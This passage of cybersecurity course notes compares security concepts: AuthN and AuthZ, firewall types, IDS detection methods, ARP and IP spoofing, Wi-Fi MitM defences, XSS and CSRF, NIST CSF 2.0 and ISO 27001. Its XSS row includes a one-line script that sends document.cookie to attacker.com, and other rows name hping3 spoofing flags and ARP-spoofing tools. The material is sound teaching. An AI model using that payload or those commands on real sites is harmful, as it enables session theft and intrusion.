**Authentication (AuthN)** and **Authorization (AuthZ)** are sequential identity security processes that are often confused but serve distinct purposes:

| Aspect | Authentication ("Who are you?") | Authorization ("What are you allowed to do?") |
| :--- | :--- | :--- |
| **Core Definition** | The process of verifying the **identity** of a user, device, or system. | The process of determining the **permissions and access rights** of an already authenticated user. |
| **Execution Order** | Always occurs **first** at the login boundary. | Always occurs **second**, immediately after successful authentication. |
| **Mechanisms Used** | Passwords, Multi-Factor Authentication (MFA/TOTP), biometrics, `htpasswd` (`basic_ncsa_auth`), SSH keys. | Role-Based Access Control (RBAC), AWS IAM Policies, S3 Bucket Policies, Squid `acl` / `http_access` rules. |
| **HTTP Status Code on Failure** | **`401 Unauthorized`** (or **`407 Proxy Authentication Required`** in Squid). | **`403 Forbidden`** (or AWS `AccessDenied`). |
| **Lab Example** | Logging into AWS Console with username, password, and MFA code. | Our Experiment 5 read-only IAM user being allowed to run `s3:GetObject` (download) but denied `s3:PutObject` (upload). |

**4. How do Stateful Packet Inspection firewalls differ from Stateless Packet Filtering firewalls?**
**Stateful** and **Stateless** firewalls differ in whether they remember the context of active network connections when evaluating individual packets:

| Feature | Stateless Packet Filtering Firewall | Stateful Packet Inspection Firewall (e.g., UFW / `iptables`) |
| :--- | :--- | :--- |
| **Connection Memory** | **No memory (Stateless):** Inspects every single packet in complete isolation without knowing if it belongs to an existing session. | **Maintains State Table:** Tracks the full lifecycle of active TCP/UDP sessions (`NEW`, `ESTABLISHED`, `RELATED`, `INVALID`). |
| **Return Traffic Handling** | Requires explicit inbound rules allowing high ephemeral ports (`1024–65535`) for return traffic, creating a major security hole. | Automatically allows return packets matching an `ESTABLISHED` or `RELATED` outbound connection without opening inbound ports. |
| **Inspection Criteria** | Checks only static Layer 3/4 header fields (Source/Dest IP, Source/Dest Port, TCP flags like `ACK`). | Checks IP/Port headers **plus** TCP sequence numbers, handshake progression, and connection state table entries. |
| **Vulnerability to Spoofing** | Easily fooled by spoofed `ACK` scans (`nmap -sA`). | Drops unsolicited `ACK` packets as `INVALID` because no matching `SYN` session exists in the state table. |

**5. What is the difference between Signature-Based detection and Anomaly-Based detection in an IDS?**
Intrusion Detection Systems (IDS) use two primary methodologies to identify malicious network or host activity:

| Feature | Signature-Based Detection (Misuse Detection) | Anomaly-Based Detection (Behavioral Detection) |
| :--- | :--- | :--- |
| **How It Works** | Compares network packets against a pre-defined database of known attack patterns ("signatures" or rules, such as Suricata/Snort `local.rules`). | Establishes a statistical baseline of "normal" network/user behavior (bandwidth, protocols, login times) and alerts on significant deviations. |
| **Zero-Day Attack Detection** | **Cannot detect Zero-Day attacks:** If an attack signature is not yet in the rule database, it passes undetected (**High False Negatives** for new threats). | **Can detect Zero-Day attacks:** Flags novel exploits if they cause abnormal traffic spikes or unusual behavior. |
| **False Positive Rate** | **Very Low False Positives:** Alerts only trigger when exact byte sequences, flags (`itype:8`), or thresholds match. | **High False Positives:** Legitimate spikes in user traffic or administrative backups can trigger false alarms. |
| **Lab Example** | Our Suricata/Snort rule `sid:1000001` matching `icmp` packets with `itype:8`. | Flagging a sudden 500% increase in outbound data transfer at 3:00 AM. |

**6. How does ARP Spoofing at Layer 2 (Data Link) differ from IP Spoofing at Layer 3 (Network)?**
**ARP Spoofing** and **IP Spoofing** operate at different layers of the OSI model and serve different tactical goals during an attack:

| Feature | ARP Spoofing / ARP Poisoning (OSI Layer 2 - Data Link) | IP Spoofing (OSI Layer 3 - Network) |
| :--- | :--- | :--- |
| **Target Protocol & Identifier** | Manipulates the **Address Resolution Protocol (ARP)**, forging associations between **MAC addresses** and IP addresses. | Manipulates the **IPv4/IPv6 packet header**, forging the **Source IP address** field. |
| **Network Scope** | **Local Area Network (LAN) / Broadcast Domain only:** ARP packets are non-routable across Layer 3 routers. | **Routable across subnets and the Internet:** Spoofed IP packets travel across routers to remote targets. |
| **Mechanism** | Sends unsolicited gratuitous ARP replies telling the victim *"I am the Default Gateway's IP (here is my MAC)"* and telling the gateway *"I am the Victim's IP"*. | Uses raw socket tools (`hping3 -a <fake-IP>` or `--rand-source`) to write a fake source IP into outgoing packets. |
| **Primary Attack Goal** | **Man-in-the-Middle (MitM) Interception:** Forces bidirectional LAN traffic to flow through the attacker's machine for sniffing. | **Blind DoS Flooding & Evasion:** Used in SYN floods (`hping3`) or amplification attacks where the attacker does not need to receive the reply packet. |

**7. How does a Man-in-the-Middle (MitM) attack work on open Wi-Fi networks, and how do HTTPS/TLS and VPNs prevent it?**
On an **open (unencrypted) Wi-Fi network** (or via an attacker-controlled **Evil Twin** rogue access point), an attacker positioned on the same wireless segment can execute a **Man-in-the-Middle (MitM) attack** by using **ARP Spoofing** (with tools like `arpspoof` or `ettercap`) or rogue DHCP/DNS responses to place their Kali Linux machine silently between the victim's device and the Wi-Fi router. All plaintext HTTP requests, session cookies, and credentials sent by the victim pass directly through the attacker's network interface, where they can be captured in **Wireshark** or altered in transit.
* **How HTTPS/TLS Prevents MitM:** **HTTPS (HTTP over TLS)** encrypts application-layer traffic end-to-end between the browser and the web server using asymmetric public-key certificates (**RSA/ECDHE**) to exchange a symmetric session key (**AES-GCM**). If a MitM attacker attempts to intercept HTTPS traffic using a fake certificate, the victim's browser detects that the certificate is not signed by a trusted Certificate Authority (CA) and displays a strict security warning (**HSTS** blocks bypassing this warning).
* **How a VPN Prevents MitM:** A **Virtual Private Network (VPN)** (such as WireGuard or IPsec/OpenVPN) encapsulates and encrypts **all** Layer 3 network traffic (including DNS queries and non-HTTPS protocols) inside an encrypted tunnel from the user's device directly to a trusted external VPN server, rendering local Wi-Fi sniffing completely blind.

**8. How do Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) differ in target and execution mechanism?**
While both **XSS** and **CSRF** are client-side web vulnerabilities, they exploit opposite trust relationships:

| Feature | Cross-Site Scripting (XSS) | Cross-Site Request Forgery (CSRF) |
| :--- | :--- | :--- |
| **Trust Exploited** | Exploits the **user's trust in a legitimate website** (runs malicious script inside the victim's browser under the site's origin). | Exploits the **website's trust in an authenticated user's browser** (tricks the browser into sending an unintended request with valid session cookies). |
| **Execution Mechanism** | Attacker injects malicious **JavaScript** (e.g., `<script>fetch('http://attacker.com/?c='+document.cookie)</script>`) into a vulnerable page (Reflected, Stored, or DOM-based). | Attacker hosts a hidden HTML form or image tag on an external site that automatically submits a state-changing `POST`/`GET` request (e.g., `/transfer?to=attacker&amt=1000`) while the victim is logged in. |
| **Capability** | **Read & Write:** Can read page content, steal `document.cookie` (if not `HttpOnly`), log keystrokes, and perform any action on behalf of the user. | **Write-Only (Blind):** Can trigger state-changing actions (password change, fund transfer) but **cannot read** the server's response due to the Same-Origin Policy (SOP). |
| **Primary Defense** | Context-aware **Output Encoding / Escaping**, input sanitization, and **Content Security Policy (CSP)** headers. | **Anti-CSRF Tokens** (synchronizer tokens), **`SameSite=Strict` / `Lax`** cookie attributes, and re-authentication. |

**9. What are the 6 core functions of the NIST Cybersecurity Framework (CSF 2.0)?**
The **NIST Cybersecurity Framework (CSF 2.0)** organizes cybersecurity risk management activities at their highest level into **6 Core Functions** that operate continuously across an organization:
1. **GOVERN (GV) *(Added in CSF 2.0)*:** Establishes, communicates, and monitors the organization's cybersecurity risk management strategy, expectations, policies, roles, responsibilities, and supply chain oversight. *(Overarching function that informs the other five).*
2. **IDENTIFY (ID):** Understands the organization's current cybersecurity risks by cataloging physical and software assets, data flows, and vulnerabilities (e.g., running **Nmap** asset discovery and **OpenVAS/Nessus** vulnerability scans).
3. **PROTECT (PR):** Implements safeguards to manage cybersecurity risks and prevent or limit the impact of potential events (e.g., configuring **AWS S3 MFA**, read-only IAM policies, **UFW firewalls**, **Squid ACLs**, and encryption).
4. **DETECT (DE):** Finds and analyzes possible cybersecurity attacks and compromises in a timely manner (e.g., monitoring **Suricata/Snort NIDS** alerts in `fast.log` and Squid `access.log`).
5. **RESPOND (RS):** Takes action regarding a detected cybersecurity incident to contain its impact (e.g., blocking attacking IPs on the firewall during a DoS attack).
6. **RECOVER (RC):** Restores assets and normal operations affected by a cybersecurity incident (e.g., restoring corrupted files from immutable S3 backups).

**10. What is the main objective of ISO/IEC 27001, and what is an Information Security Management System (ISMS)?**
* **Main Objective of ISO/IEC 27001:** **ISO/IEC 27001** (jointly published by the International Organization for Standardization and the International Electrotechnical Commission, latest revision **ISO/IEC 27001:2022**) is the premier international standard for information security management. Its main objective is to provide organizations of any size or industry with a formal, risk-based specification for establishing, implementing, maintaining, and continually improving an **Information Security Management System (ISMS)** to protect the **Confidentiality, Integrity, and Availability (CIA)** of information assets.
* **What is an ISMS?** An **Information Security Management System (ISMS)** is not a single software tool; rather, it is a holistic, documented framework of **policies, procedures, organizational structures, risk assessments, and technical/physical security controls** (detailed across **93 controls in Annex A** grouped into Organizational, People, Physical, and Technological themes). An ISMS operates on a continuous risk-management lifecycle (identifying assets $\rightarrow$ assessing threats/vulnerabilities $\rightarrow$ treating risks via Annex A controls like **A.8.8 Vulnerability Management** and **A.8.20 Network Security** $\rightarrow$ auditing compliance), allowing organizations to achieve independent third-party certification.